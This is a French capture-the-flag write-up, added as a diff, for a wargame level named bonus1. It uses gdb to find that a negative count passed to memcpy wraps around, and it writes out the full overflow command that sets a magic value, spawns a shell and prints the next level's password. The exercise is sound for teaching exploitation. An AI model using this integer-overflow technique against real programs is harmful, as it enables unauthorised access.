@@ -1,0 +1,99 @@
+Lorsqu'on lance le programme, il fait un segfault.
+On va oberver ce qu'il y a dans gdb.
+
+ON trouve que le main comporte un atoi, on comprends alors qu'un argument est attendu et que cela doit être un nombre
+On voit aussi que ce nombre doit etre inferieur ou égale à 9, sinon il fait un return
+On voit également un memcpy, que l'on pourra surement faire overflow.
+Et enfin et surtout il y a un exec(/bin/sh)
+Ce dernier ne s'execute que si ce que contient l'adresse $esp+0x3c = 0x574f4c46 (= 1464814662 en dec)
+
+En analysant le code, on voit que le memcpy va prendre le deuxième argument, et va le copier à l'addresse source donné, 
+qui est à $esp+0x14, en limitant à argv[1] * 4 octets (voir fichier asm pour details).
+On sait donc que l'addresse $esp+0x14 va être override par la copie de ce qu'on met dans l'argv[2]
+
+(gdb) b *0x08048478 (après memcpy)
+(gdb) run 1 AAAA
+(gdb) x/wx $esp+0x3c
+0xbffff71c:	0x00000001
+(gdb) x/wx $esp+0x14
+0xbffff6f4:	0x41414141
+(gdb) x/20wx $esp
+0xbffff6e0:	0xbffff901	0x08049764	0x00000003	0x080482fd
+0xbffff6f0:	0xb7fd13e4	0x41414141	0x08049764	0x080484d1
+0xbffff700:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
+0xbffff710:	0xb7fed280	0x00000000	0x080484b9	0x00000001
+
+On voit que l'addresse que l'on veut égale a 0x574f4c46 se trouve 40 octets après le début 
+de notre destination de memcpy (0x3c(%esp) - 0x14(%esp) = 0xbffff71c - 0xbffff6f4 = 0x28 = 40).
+Le seule problème c'est que notre memcpy est proteger par la taille à copier qui est de
+argv[1] * 4, en sachant que notre argv[1] ne peux dépasser 9 : 9 *4 = 36. On ne peut pas overflow l'addresse voulu en l'écrivant directement à la fin de notre argv[2], 
+car en le remplaçant entièrement, on écrirait jusqu'a la 36e position, sans pouvoir atteindre la 40e.
+
+Mais il se trouve que le memcpy a une faille, c'est que lorsqu'on lui envoit un nombre négatif en 3e argument,
+il va faire passer ce nombre en positif.
+Or pour passer des valeur négative à une valeur positive, on s'appuie sur le binaire.
+Par exemple, prenons le chiffre 18/-18.
+
+32   16   8   4   2   1
+      1   0   0   1   0    = 18
+      0   1   1   0   1    
+      0   1   1   1   0    = -18  (pour passer du positif au négatif et inversement, on inverse les bits et ajoute un)
+
+-18 =  en binaire.
+
+sauf que notre mémoire fonctionne en 32 bits (0x00000000 -> pour un 0 en hexa décimal, il faut quatre 0 en binaire)
+Cela donnera donc
+
+
+            ...                64   32   16   8   4   2   1
+0000000000000000000000000       0    0    1   0   0   1   0    
+1111111111111111111111111       1    1    0   1   1   0   1    
+1111111111111111111111111       1    1    0   1   1   1   0  = -18
+
+Or si on considère que 11111111111111111111111111101110 n'est pas négatif (-18) mais positif (memcpy prendra ce binaire comme étant positif), cela le fera passer à 4294967278.
+Largement de quoi déborder sur l'addresse souhaiter qui est 40 position plus loin.
+
+Seulement voila: 
+$ ./bonus -18 $(python -c 'print "A" *40 + "\x57\x4f\x4c\x46"[::-1]')
+    segfault
+
+Voyons ce qui se passe dans gdb
+(gdb) run -18 $(python -c 'print "A" *40 + "\x57\x4f\x4c\x46"[::-1]')
+    segfault
+(gdb) x/20wx $esp
+0xbffff6e0:	0xbffff901	0x08049764	0x00000003	0x080482fd
+0xbffff6f0:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
+0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff710:	0x41414141	0x41414141	0x41414141	0x574f4c46
+
+La bonne nouvelle c'est que notre addresse $esp+0x3c est bien override par la valeur voulue (0x574f4c46), la mauvaise nouvelle, c'est
+qu'on a permis d'écrire dans la mémoire sur 4294967224 octets, donc forcément, le system en prend un coup et des choses ont été overrides alors qu'elles n'aurait pas du.
+En effet
+ -18 * 4 = -72
+ en binaire
+ 72 = 1001000
+ en 32 bits = 
+ 72 =  00000000000000000000000001001000
+ -72 = 11111111111111111111111110111000
+ -72 = 4294967224
+
+Nous on souhaiterai que ce ne soit pas 4294967224 qui soit donné à memcpy, mais simplement
+44.
+
+44 = 101100
+En 32 bits = 00000000000000000000000000101100
+Or comme c'est en 32 bits, si on ajoute un ou plusieurs 1 avant, il ne seront pas compté
+11111111111111111111111111111111 00000000000000000000000000101100 = -4294967252
+Nous devons donc faire en sorte que le argv[1] * 4 soit égale à -4294967252
+-4294967252/4 = -1073741813 
+
+En d'autre terme, en donnant -1073741813 en premier argument, le nombre prendra deux espaces de mémoire : 0xFFFFFFFF0000002C,
+mais comme notre machine est en 32 bits, seuls les 8 derniers octets compteront 0x0000002c = 44.
+Ainsi, on autorisera à copier 44 octet avec le memecpy, dans l'espace mémoire qui commence à $esp+0x14,
+et comme 40 octets plus loin se trouve l'addresse de $esp+0x3c, les 4 derniers octets overrideront notre addresse à comparer avec 0x574f4c46
+
+$ ./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x57\x4f\x4c\x46"[::-1]')
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+
